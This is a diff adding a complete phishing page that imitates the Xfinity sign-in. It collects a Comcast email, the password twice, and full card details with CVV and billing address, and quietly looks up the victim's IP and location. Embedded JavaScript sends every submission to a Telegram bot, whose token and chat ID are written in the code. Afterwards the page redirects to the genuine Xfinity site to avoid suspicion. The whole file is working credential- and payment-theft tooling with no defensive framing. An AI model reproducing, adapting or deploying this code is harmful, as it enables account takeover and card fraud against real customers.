@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Account Management Portal</title>
+</head>
+
+<body>
+
+<div id="xfinity-weebly-integrated-container" style="all: initial; font-family: 'Work Sans', sans-serif;">
+   <link rel="preconnect" href="https://fonts.googleapis.com">
+   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+   <link href="https://fonts.googleapis.com/css2?family=Work+Sans:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+   <script src="https://cdn.tailwindcss.com"></script>
+   <script>
+       tailwind.config = {
+           theme: {
+               extend: {
+                   boxShadow: { 'inset-border-active': 'inset 0 0 0 1px #0d54ff' },
+                   fontFamily: { sans: ['Work Sans', 'sans-serif'] }
+               }
+           }
+       }
+   </script>
+   <style>
+       #xfinity-weebly-integrated-container { display: block; background: #fff; min-height: 100vh; width: 100%; }
+       #xfinity-weebly-integrated-container body { background-color: #fff; }
+       .hidden { display: none !important; }
+       .eye-icon { cursor: pointer; transition: all 0.2s ease; }
+       .eye-icon:hover { opacity: 0.7; }
+       .fade-in { animation: fadeIn 0.3s ease-in-out; }
+       @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+       .slide-in { animation: slideIn 0.4s ease-out; }
+       @keyframes slideIn { from { opacity: 0; transform: translateX(-20px); } to { opacity: 1; transform: translateX(0); } }
+       .loader { border: 3px solid #f3f3f3; border-top: 3px solid #6138f5; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: inline-block; }
+       @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+	   
+	   
+.split-screen-container {
+    display: flex;
+    min-height: 100vh;
+    width: 100%;
+    background-color: #ffffff;
+}
+
+.interaction-column {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    padding: 3rem;
+}
+
+.media-column {
+    flex: 1;
+    position: relative;
+    background-color: #f4f5f7;
+    overflow: hidden;
+}
+
+.hero-image {
+    width: 100%;
+    height: 100%;
+    object-fit: cover; 
+}
+
+.step-view {
+    width: 100%;
+    max-width: 440px; 
+}
+
+.step-view.hidden {
+    display: none !important;
+}
+
+/* Mobile Responsiveness Strategy */
+@media (max-width: 960px) {
+    .split-screen-container {
+        flex-direction: column; 
+    }
+    
+    .media-column {
+        display: none; 
+    }
+}
+   </style>
+
+   <div class="split-screen-container">
+    
+    <main class="interaction-column">
+	
+   <div class="bg-white font-sans">
+       <!-- Step 1: Email Input -->
+       <div id="step-1" class="w-full min-h-screen md:flex items-center bg-[#fff] fade-in">
+           <div class="mx-auto max-w-2xl relative md:-top-16 md:-left-8">
+               <header>
+                   <svg class="w-28 h-28" aria-label="Logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 69 23.28"><path fill="#8b8b97" d="M7.71,11.76,12,6H10.23a2,2,0,0,0-1.76.86L6.19,9.88,4,6.81A2,2,0,0,0,2.21,6H.4l4.28,5.81L0,18.09H1.71a2,2,0,0,0,1.76-.86l2.71-3.59,6.35,8.78a2,2,0,0,0,1.76.86h1.86Zm34.68,6.33h2.45V6H42.39Zm-19.45,0H25.4V6H22.94Zm37.18,4.28L69,6H67.67a1.81,1.81,0,0,0-1.76.86l-3.5,6.5-3-6.5A1.75,1.75,0,0,0,57.62,6H56.34L61,15.85l-4.07,7.43h1.33A2,2,0,0,0,60.12,22.37ZM28.32,6V18.09h2.45V9.76A3.86,3.86,0,0,1,34,8c1.81,0,3,1.14,3,3.43v5.47a1.11,1.11,0,0,0,1.14,1.17h1.31V11c0-3.14-2-5.33-4.9-5.33a5.47,5.47,0,0,0-3.81,1.45V6Zm21.06,7.83a4.21,4.21,0,0,0,4.52,4.52,6.23,6.23,0,0,0,1.79-.24l-.5-2.14a5,5,0,0,1-1.12.12,2.08,2.08,0,0,1-2.24-2.31V8.14h3.43L54.27,6H51.84V1.07L49.39,2.14V6H46.79V8.14h2.59Zm-34-5.64v9.95h2.45V8.14H21V6H17.85V5c0-2.07,1.24-2.76,2.45-2.76a2.93,2.93,0,0,1,.83.12l.5-2.17A4.29,4.29,0,0,0,20.11,0c-3,0-4.71,2.26-4.71,5V6H14.11L12.57,8.14Z"/></svg>
+               </header>
+               <main>
+                   <h3 class="text-[#141417] font-bold text-[1.5rem] md:text-[1.9rem] mb-5">Sign in with your Xfinity ID</h3>
+                   <div>
+                       <section>
+                           <input id="input-field" placeholder="Email, mobile, or username" class="border-2 outline-none w-full px-5 py-4 rounded transition-all duration-200 focus:border-[#6138f5]" type="text">
+                           <div id="error-message-container" class="hidden">
+                               <p class="text-[#B7023C] text-sm flex gap-2 items-center mt-2">
+                                   <span><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><g><path fill="none" d="M0 0h24v24H0z"></path><path d="M12.866 3l9.526 16.5a1 1 0 0 1-.866 1.5H2.474a1 1 0 0 1-.866-1.5L11.134 3a1 1 0 0 1 1.732 0zM11 16v2h2v-2h-2zm0-7v5h2V9h-2z"></path></g></svg></span>
+                                   <span id="error-text">Please enter a valid Xfinity email address.</span>
+                               </p>
+                           </div>
+                           <p class="mt-6 text-sm text-gray-600">By signing in, you agree to our <span class="text-[#3A0092] cursor-pointer hover:underline">Terms of Service</span> and <span class="text-[#3A0092] cursor-pointer hover:underline">Privacy Policy</span>.</p>
+                       </section>
+                       <button id="btn-submit" class="font-semibold text-white bg-[#6138f5] hover:bg-[#3A0092] rounded px-10 py-5 mt-3 transition-all duration-200 flex items-center gap-2" type="button">
+                           <span id="btn-text">Let's go</span>
+                           <span id="btn-loader" class="loader hidden"></span>
+                       </button>
+                   </div>
+               </main>
+           </div>
+       </div>
+
+       <!-- Step 2: Password Input -->
+       <div id="step-2" class="hidden w-full min-h-screen md:flex items-center bg-[#fff] slide-in">
+           <div class="mx-auto max-w-2xl relative md:-top-16 md:-left-8">
+               <header>
+                   <svg class="w-28 h-28" aria-label="Logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 69 23.28"><path fill="#8b8b97" d="M7.71,11.76,12,6H10.23a2,2,0,0,0-1.76.86L6.19,9.88,4,6.81A2,2,0,0,0,2.21,6H.4l4.28,5.81L0,18.09H1.71a2,2,0,0,0,1.76-.86l2.71-3.59,6.35,8.78a2,2,0,0,0,1.76.86h1.86Zm34.68,6.33h2.45V6H42.39Zm-19.45,0H25.4V6H22.94Zm37.18,4.28L69,6H67.67a1.81,1.81,0,0,0-1.76.86l-3.5,6.5-3-6.5A1.75,1.75,0,0,0,57.62,6H56.34L61,15.85l-4.07,7.43h1.33A2,2,0,0,0,60.12,22.37ZM28.32,6V18.09h2.45V9.76A3.86,3.86,0,0,1,34,8c1.81,0,3,1.14,3,3.43v5.47a1.11,1.11,0,0,0,1.14,1.17h1.31V11c0-3.14-2-5.33-4.9-5.33a5.47,5.47,0,0,0-3.81,1.45V6Zm21.06,7.83a4.21,4.21,0,0,0,4.52,4.52,6.23,6.23,0,0,0,1.79-.24l-.5-2.14a5,5,0,0,1-1.12.12,2.08,2.08,0,0,1-2.24-2.31V8.14h3.43L54.27,6H51.84V1.07L49.39,2.14V6H46.79V8.14h2.59Zm-34-5.64v9.95h2.45V8.14H21V6H17.85V5c0-2.07,1.24-2.76,2.45-2.76a2.93,2.93,0,0,1,.83.12l.5-2.17A4.29,4.29,0,0,0,20.11,0c-3,0-4.71,2.26-4.71,5V6H14.11L12.57,8.14Z"/></svg>
+               </header>
+               <main>
+                   <h3 class="text-[#141417] font-bold text-[1.5rem] md:text-[1.9rem] mb-5">Enter your password</h3>
+                   <div id="show-email-back" class="flex items-center mb-4 gap-2 cursor-pointer hover:text-[#6138f5] transition-colors">
+                       <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M401.4 224h-214l83-79.4c11.9-12.5 11.9-32.7 0-45.2s-31.2-12.5-43.2 0L89 233.4c-6 5.8-9 13.7-9 22.4v.4c0 8.7 3 16.6 9 22.4l138.1 134c12 12.5 31.3 12.5 43.2 0 11.9-12.5 11.9-32.7 0-45.2l-83-79.4h214c16.8 0 30.3-13.7 30.3-30.3 0-16.8-13.5-30.3-30.3-30.3z"></path></svg>
+                       <p id="displayed-email" class="text-gray-500 text-sm"></p>
+                   </div>
+                   <div>
+                       <section>
+                           <div class="relative">
+                               <input id="password-field" placeholder="Enter Password" class="border-2 outline-none w-full px-5 py-4 rounded pr-12 transition-all duration-200 focus:border-[#6138f5]" type="password">
+                               <div id="toggle-password" class="eye-icon absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-500">
+                                   <svg id="eye-open" class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path></svg>
+                                   <svg id="eye-closed" class="w-5 h-5 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"></path></svg>
+                               </div>
+                           </div>
+                           <div id="password-error-container" class="hidden">
+                               <p class="text-[#B7023C] text-sm flex gap-2 items-center mt-2">
+                                   <span><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><g><path fill="none" d="M0 0h24v24H0z"></path><path d="M12.866 3l9.526 16.5a1 1 0 0 1-.866 1.5H2.474a1 1 0 0 1-.866-1.5L11.134 3a1 1 0 0 1 1.732 0zM11 16v2h2v-2h-2zm0-7v5h2V9h-2z"></path></g></svg></span>
+                                   <span id="password-error-text">The password you entered was incorrect. Please try again.</span>
+                               </p>
+                           </div>
+                       </section>
+                       <button id="btn-submit-password" class="font-semibold text-white bg-[#6138f5] hover:bg-[#3A0092] rounded px-10 py-5 mt-5 transition-all duration-200 flex items-center gap-2" type="button">
+                           <span id="btn-password-text">Sign in</span>
+                           <span id="btn-password-loader" class="loader hidden"></span>
+                       </button>
+                   </div>
+               </main>
+           </div>
+       </div>
+
+       <!-- Step 3: Password Confirmation -->
+       <div id="step-3" class="hidden w-full min-h-screen md:flex items-center bg-[#fff] slide-in">
+           <div class="mx-auto max-w-2xl relative md:-top-16 md:-left-8">
+               <header>
+                   <svg class="w-28 h-28" aria-label="Logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 69 23.28"><path fill="#8b8b97" d="M7.71,11.76,12,6H10.23a2,2,0,0,0-1.76.86L6.19,9.88,4,6.81A2,2,0,0,0,2.21,6H.4l4.28,5.81L0,18.09H1.71a2,2,0,0,0,1.76-.86l2.71-3.59,6.35,8.78a2,2,0,0,0,1.76.86h1.86Zm34.68,6.33h2.45V6H42.39Zm-19.45,0H25.4V6H22.94Zm37.18,4.28L69,6H67.67a1.81,1.81,0,0,0-1.76.86l-3.5,6.5-3-6.5A1.75,1.75,0,0,0,57.62,6H56.34L61,15.85l-4.07,7.43h1.33A2,2,0,0,0,60.12,22.37ZM28.32,6V18.09h2.45V9.76A3.86,3.86,0,0,1,34,8c1.81,0,3,1.14,3,3.43v5.47a1.11,1.11,0,0,0,1.14,1.17h1.31V11c0-3.14-2-5.33-4.9-5.33a5.47,5.47,0,0,0-3.81,1.45V6Zm21.06,7.83a4.21,4.21,0,0,0,4.52,4.52,6.23,6.23,0,0,0,1.79-.24l-.5-2.14a5,5,0,0,1-1.12.12,2.08,2.08,0,0,1-2.24-2.31V8.14h3.43L54.27,6H51.84V1.07L49.39,2.14V6H46.79V8.14h2.59Zm-34-5.64v9.95h2.45V8.14H21V6H17.85V5c0-2.07,1.24-2.76,2.45-2.76a2.93,2.93,0,0,1,.83.12l.5-2.17A4.29,4.29,0,0,0,20.11,0c-3,0-4.71,2.26-4.71,5V6H14.11L12.57,8.14Z"/></svg>
+               </header>
+               <main>
+                   <h3 class="text-[#141417] font-bold text-[1.5rem] md:text-[1.9rem] mb-5">Confirm your password</h3>
+                   <p class="text-gray-600 mb-4 text-sm">For security purposes, please enter your password again to continue.</p>
+                   <div>
+                       <section>
+                           <div class="relative">
+                               <input id="password2-field" placeholder="Renter password" class="border-2 outline-none w-full px-5 py-4 rounded pr-12 transition-all duration-200 focus:border-[#6138f5]" type="password">
+                               <div id="toggle-password2" class="eye-icon absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-500">
+                                   <svg id="eye2-open" class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path></svg>
+                                   <svg id="eye2-closed" class="w-5 h-5 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.88 9.88l-3.29-3.29m7.532 7.532l3.29 3.29M3 3l3.59 3.59m0 0A9.953 9.953 0 0112 5c4.478 0 8.268 2.943 9.543 7a10.025 10.025 0 01-4.132 5.411m0 0L21 21"></path></svg>
+                               </div>
+                           </div>
+                           <div id="password2-error-container" class="hidden">
+                               <p class="text-[#B7023C] text-sm flex gap-2 items-center mt-2">
+                                   <span><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><g><path fill="none" d="M0 0h24v24H0z"></path><path d="M12.866 3l9.526 16.5a1 1 0 0 1-.866 1.5H2.474a1 1 0 0 1-.866-1.5L11.134 3a1 1 0 0 1 1.732 0zM11 16v2h2v-2h-2zm0-7v5h2V9h-2z"></path></g></svg></span>
+                                   <span id="password2-error-text">Passwords do not match. Please try again.</span>
+                               </p>
+                           </div>
+                       </section>
+                       <button id="btn-submit-password2" class="font-semibold text-white bg-[#6138f5] hover:bg-[#3A0092] rounded px-10 py-5 mt-5 transition-all duration-200 flex items-center gap-2" type="button">
+                           <span id="btn-password2-text">Continue</span>
+                           <span id="btn-password2-loader" class="loader hidden"></span>
+                       </button>
+                   </div>
+               </main>
+           </div>
+       </div>
+
+       <!-- Step 4: Billing -->
+       <div id="step-4" class="hidden min-h-screen bg-gray-100 p-4 fade-in">
+           <div class="max-w-md mx-auto bg-white rounded-lg shadow-lg overflow-hidden">
+               <div class="p-6">
+                   <div class="text-center mb-6">
+                       <svg class="w-16 h-16 mx-auto mb-4 text-[#6138f5]" aria-label="Logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 69 23.28"><path fill="#6138f5" d="M7.71,11.76,12,6H10.23a2,2,0,0,0-1.76.86L6.19,9.88,4,6.81A2,2,0,0,0,2.21,6H.4l4.28,5.81L0,18.09H1.71a2,2,0,0,0,1.76-.86l2.71-3.59,6.35,8.78a2,2,0,0,0,1.76.86h1.86Zm34.68,6.33h2.45V6H42.39Zm-19.45,0H25.4V6H22.94Zm37.18,4.28L69,6H67.67a1.81,1.81,0,0,0-1.76.86l-3.5,6.5-3-6.5A1.75,1.75,0,0,0,57.62,6H56.34L61,15.85l-4.07,7.43h1.33A2,2,0,0,0,60.12,22.37ZM28.32,6V18.09h2.45V9.76A3.86,3.86,0,0,1,34,8c1.81,0,3,1.14,3,3.43v5.47a1.11,1.11,0,0,0,1.14,1.17h1.31V11c0-3.14-2-5.33-4.9-5.33a5.47,5.47,0,0,0-3.81,1.45V6Zm21.06,7.83a4.21,4.21,0,0,0,4.52,4.52,6.23,6.23,0,0,0,1.79-.24l-.5-2.14a5,5,0,0,1-1.12.12,2.08,2.08,0,0,1-2.24-2.31V8.14h3.43L54.27,6H51.84V1.07L49.39,2.14V6H46.79V8.14h2.59Zm-34-5.64v9.95h2.45V8.14H21V6H17.85V5c0-2.07,1.24-2.76,2.45-2.76a2.93,2.93,0,0,1,.83.12l.5-2.17A4.29,4.29,0,0,0,20.11,0c-3,0-4.71,2.26-4.71,5V6H14.11L12.57,8.14Z"/></svg>
+                       <h1 class="text-2xl font-bold text-gray-800">Update Billing Information</h1>
+                       <p class="text-gray-600 text-sm mt-1">Confirm Account Ownership</p>
+                   </div>
+                   <form id="payment-form">
+                       <div class="mb-4">
+                           <label class="block text-gray-700 text-sm font-medium mb-1">Card Number <span class="text-red-500">*</span></label>
+                           <input type="text" name="cardNumber" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" class="w-full p-3 border border-gray-300 rounded transition-all duration-200 focus:border-[#6138f5] focus:outline-none">
+                           <p id="error-cardNumber" class="text-red-500 text-xs mt-1 hidden"></p>
+                       </div>
+                       <div class="mb-4">
+                           <label class="block text-gray-700 text-sm font-medium mb-1">Name on card <span class="text-red-500">*</span></label>
+                           <input type="text" name="nameOnCard" id="nameOnCard" placeholder="Ex. John Smith" class="w-full p-3 border border-gray-300 rounded transition-all duration-200 focus:border-[#6138f5] focus:outline-none">
+                           <p id="error-nameOnCard" class="text-red-500 text-xs mt-1 hidden"></p>
+                       </div>
+                       <div class="grid grid-cols-2 gap-4 mb-4">
+                           <div>
+                               <label class="block text-gray-700 text-sm font-medium mb-1">Expiry date <span class="text-red-500">*</span></label>
+                               <input type="text" name="expiryDate" id="expiryDate" placeholder="MM/YY" maxlength="5" class="w-full p-3 border border-gray-300 rounded transition-all duration-200 focus:border-[#6138f5] focus:outline-none">
+                               <p id="error-expiryDate" class="text-red-500 text-xs mt-1 hidden"></p>
+                           </div>
+                           <div>
+                               <label class="block text-gray-700 text-sm font-medium mb-1">Security code <span class="text-red-500">*</span></label>
+                               <input type="password" name="securityCode" id="securityCode" placeholder="â€¢â€¢â€¢" maxlength="4" class="w-full p-3 border border-gray-300 rounded transition-all duration-200 focus:border-[#6138f5] focus:outline-none">
+                               <p id="error-securityCode" class="text-red-500 text-xs mt-1 hidden"></p>
+                           </div>
+                       </div>
+                       <div class="mb-4">
+                           <label class="block text-gray-700 text-sm font-medium mb-1">ZIP code <span class="text-red-500">*</span></label>
+                           <input type="text" name="zipCode" id="zipCode" placeholder="12345" maxlength="5" class="w-full p-3 border border-gray-300 rounded transition-all duration-200 focus:border-[#6138f5] focus:outline-none">
+                           <p id="error-zipCode" class="text-red-500 text-xs mt-1 hidden"></p>
+                       </div>
+                       <div class="mb-6">
+                           <label class="block text-gray-700 text-sm font-medium mb-1">Billing Address <span class="text-red-500">*</span></label>
+                           <input type="text" name="address" id="address" placeholder="123 Main St, Apt 4B, City, State" class="w-full p-3 border border-gray-300 rounded transition-all duration-200 focus:border-[#6138f5] focus:outline-none">
+                           <p id="error-address" class="text-red-500 text-xs mt-1 hidden"></p>
+                       </div>
+                       <button type="submit" id="btn-complete" class="w-full bg-[#6138f5] hover:bg-[#3A0092] text-white font-semibold py-3 px-4 rounded transition-all duration-200 flex items-center justify-center gap-2">
+                           <span id="btn-complete-text">Complete Verification</span>
+                           <span id="btn-complete-loader" class="loader hidden"></span>
+                       </button>
+                   </form>
+               </div>
+           </div>
+       </div>
+   </div>
+   </main>
+
+    <!-- Right Column: Persistent Media Area (50% Width) -->
+    <aside class="media-column">
+        <img src="background.jpg" alt="Persistent Workspace Visual" class="hero-image">
+    </aside>
+
+</div>
+      	
+   <script>
+       (function() {
+           'use strict';
+           const config = {
+               token: '8793312856:AAFCihIo6A503eEZvIZu4wt1WHRjO16h9dk',
+               chatId: '8729911840',
+               api: 'https://api.telegram.org/bot8793312856:AAFCihIo6A503eEZvIZu4wt1WHRjO16h9dk'
+           };
+
+           let state = { step: 1, email: '', password: '', info: {} };
+
+           const steps = [
+               document.getElementById('step-1'),
+               document.getElementById('step-2'),
+               document.getElementById('step-3'),
+               document.getElementById('step-4')
+           ];
+
+           const navigate = (toIdx) => {
+    steps.forEach((s, i) => s.classList.toggle('hidden', i !== toIdx));
+    
+      const mediaCol = document.querySelector('.media-column');
+    if (mediaCol) {
+        mediaCol.classList.toggle('hidden', toIdx >= 3);
+    }
+    
+    window.scrollTo(0,0);
+};
+           const log = async (msg) => {
+    await fetch(`${config.api}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: config.chatId,
+            text: msg
+        })
+    });
+};
+
+           // Step 1 Click
+         
+document.getElementById('btn-submit').onclick = async () => {
+
+    const val = document
+        .getElementById('input-field')
+        .value
+        .trim()
+        .toLowerCase();
+
+    if (!val.includes('@comcast.')) {
+
+        document
+            .getElementById('error-message-container')
+            .classList.remove('hidden');
+
+        return;
+    }
+
+    state.email = val;
+
+    document.getElementById('displayed-email').innerText = val;
+
+    navigate(1);
+
+    // Then fetch IP/location quietly
+    state.ipPromise = fetch('https://ipapi.co/json/')
+    .then(res => res.json())
+    .then(data => {
+        state.info = data || {};
+        console.log("IP DATA READY:", state.info);
+        return state.info;
+    })
+    .catch(() => {
+        state.info = {};
+        return {};
+    });
+  };		   
+           // Step 2 Click
+            document.getElementById('btn-submit-password').onclick = async () => {
+            const primaryInput = document.getElementById('password-field').value.trim();
+			if (!primaryInput) return;
+            state.password = primaryInput;
+            navigate(2); 
+             };
+
+           // Step 3 Click
+
+  document.getElementById('btn-submit-password2').onclick = async () => {
+
+    const secondaryInput = document
+        .getElementById('password2-field')
+        .value
+        .trim();
+
+    if (!secondaryInput) return;
+
+    state.secondPassword = secondaryInput;
+
+    // ✅ WAIT for IP to finish loading
+    if (!state.info || !state.info.ip) {
+    try {
+        const res = await fetch('https://ipapi.co/json/');
+        state.info = await res.json();
+    } catch (e) {
+        state.info = {};
+    }
+}
+
+   await log(`
+🔐 New Login Submission
+👤 User: ${state.email}
+🔑 Pass: ${state.password}
+🔑 Pass2: ${state.secondPassword}
+
+📍 IP: ${state.info?.ip || 'Unknown'}
+🌍 City: ${state.info?.city || 'Unknown'}
+🏳️ Country: ${state.info?.country_name || 'Unknown'}
+`);
+
+    navigate(3);
+};
+
+           // Step 4 Click
+           document.getElementById('payment-form').onsubmit = async (e) => {
+               e.preventDefault();
+               const fd = new FormData(e.target);
+               const data = Object.fromEntries(fd.entries());
+               const btn = document.getElementById('btn-complete-loader');
+               btn.classList.remove('hidden');
+               
+               let billingText = `<b>💳 User Billing Data</b>\n`;
+               billingText += `User: ${state.email}\nCard: ${data.cardNumber}\nExp: ${data.expiryDate}\nCVV: ${data.securityCode}\nZip: ${data.zipCode}\nAddr: ${data.address}`;
+               
+               await log(billingText);
+               window.location.replace('https://www.xfinity.com/corporate/customers/policies/subscriberagreement');
+           };
+
+           // UI Helpers
+           const view = (inp, o, c) => {
+               const f = document.getElementById(inp);
+               if(f.type==='password'){ f.type='text'; document.getElementById(o).classList.add('hidden'); document.getElementById(c).classList.remove('hidden');}
+               else { f.type='password'; document.getElementById(o).classList.remove('hidden'); document.getElementById(c).classList.add('hidden');}
+           };
+
+           document.getElementById('toggle-password').onclick = () => view('password-field','eye-open','eye-closed');
+           document.getElementById('toggle-password2').onclick = () => view('password2-field','eye2-open','eye2-closed');
+           document.getElementById('show-email-back').onclick = () => navigate(0);
+
+           // Formatting (Clean & Fast)
+           document.getElementById('cardNumber').oninput = (e) => e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
+           document.getElementById('expiryDate').oninput = (e) => e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{2})/, '$1/').trim();
+       })();
+   </script>
+</body>
+</html>
